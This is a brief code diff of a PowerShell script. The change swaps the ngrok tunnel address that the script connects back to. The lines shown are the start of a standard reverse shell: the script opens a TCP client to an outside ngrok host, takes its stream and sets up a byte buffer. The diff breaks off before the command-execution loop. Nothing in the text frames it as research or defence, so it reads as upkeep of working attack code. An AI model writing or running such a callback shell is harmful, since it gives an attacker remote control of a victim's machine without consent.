@@ -1,4 +1,4 @@
-$addr = '0.tcp.ngrok.io:12345'
+$addr = '6.tcp.ngrok.io:17353'
 $c = New-Object System.Net.Sockets.TCPClient($addr.Split(':')[0], [int]$addr.Split(':')[1]);
 $s = $c.GetStream();
 [byte[]]$b = 0..65535|%{0};
